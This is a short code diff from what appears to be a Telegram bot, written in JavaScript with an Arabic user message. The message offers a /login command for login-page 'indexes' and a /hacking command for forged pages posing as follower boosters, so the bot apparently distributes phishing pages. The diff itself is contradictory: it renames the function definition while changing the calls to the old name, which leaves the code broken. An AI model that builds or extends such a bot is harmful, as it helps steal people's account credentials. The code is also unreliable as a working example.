@@ -769,15 +769,15 @@ bot.on('message', async (msg) => {
   const senderId = msg.from.id;
 
   if (text === '/start') {
-    showButtons(senderId);
+    showDefaultButtons(senderId);
   } else if (text === '/login') {
-    showButtons(senderId);
+    showLoginButtons(senderId);
   } else if (text === '/hacking') {
-    showButtons(senderId);
+    showHackingButtons(senderId);
   }
 });
 
-function showDefaultButtons(userId) {
+function showButtons(userId) {
   let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
 
   let defaultButtons = [
